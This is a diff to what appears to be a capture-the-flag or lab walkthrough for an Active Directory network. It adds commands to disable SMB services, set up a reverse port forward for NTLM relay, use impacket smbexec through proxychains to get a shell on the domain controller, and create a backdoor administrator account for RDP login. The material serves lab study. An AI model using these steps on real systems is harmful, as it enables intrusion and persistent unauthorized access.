@@ -71,8 +71,15 @@ runas /user:adm1n "c:\\windows\\tasks\\client.exe 10.50.103.246:3232"
 Ensure smb is not running on PC-FILESRV by running the following from a command prompt:
 
 ```
-
+sc stop netlogon
+sc stop lanmanserver
+sc config lanmanserver start= disabled
+sc stop lanmanworkstation
+sc config lanmanworkstation start= disabled
+shutdown -r
 ```
+
+Note after shutdown you will need to re-establish connections, i.e. via rdesktop
 
 Kill the service running on port 80 on the attackbox. It can be found with `netstat -tulpn`.
 
@@ -99,11 +106,28 @@ Set up a reverse port forward to capture smb packets:
 ssh -NR 0.0.0.0:445:localhost:445 -J localhost:3232 bc930adddb17e253edfe31ed958c9e435ad31df3
 ```
 
-## Final machine
+## Accesing the DC
 
-Finally, to connect, use a socks4 proxy in proxychains (maybe seperate machine, as i did)
+Once the ntlm relay establishes a socks proxy (you can check with the command `socks`) smbexec against this proxy allows rce.
+
+First, setup a new socks proxy (possibly using a different machine, as I did):
 
 ```
 socks4 <attackbox> 1080
-proxychains rdesktop 10.200.107.35
 ```
+
+Then use impacket's smbexec to get a very limited shell:
+
+```
+proxychains smbexec.py HOLOLIVE/SRV-ADMIN@10.200.114.30 -no-pass
+```
+
+Add a new admin user:
+
+```
+net user user1 pass123! /add
+net localgroup Administrators /add user1
+net localgroup "Remote Desktop Users" /add user1
+```
+
+Then use proxychains and rdesktop to login: `proxychains rdesktop 10.200.107.30`. Username will be `HOLOLIVE\user1`
